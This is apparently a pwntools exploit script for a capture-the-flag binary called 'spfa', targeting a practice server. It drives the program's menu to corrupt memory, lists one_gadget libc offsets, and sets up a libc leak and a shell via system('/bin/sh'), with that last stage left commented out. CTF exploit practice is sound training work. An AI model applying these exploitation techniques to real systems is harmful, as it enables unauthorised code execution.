import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='spfa'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',28588)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('4. exit:','1')
			io.sendlineafter('input from to and length:',str(a))
			io.sendline(str(b))
			io.sendline(str(c))
			

		def find(a,b):
			io.sendlineafter('4. exit:','2')
			io.sendlineafter('input from and to:\n',str(a)+'\n'+str(b))

		def get():
			io.sendlineafter('4. exit:','3')
			
		
		for i in range(30):
			a=100
			b=0
			for j in range(i+1,30):
				add(i,j,0)
				a+=100
			for j in range(0,i):
				add(i,i-j-1,0)

				

		find(0,29)
		get()


		


		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue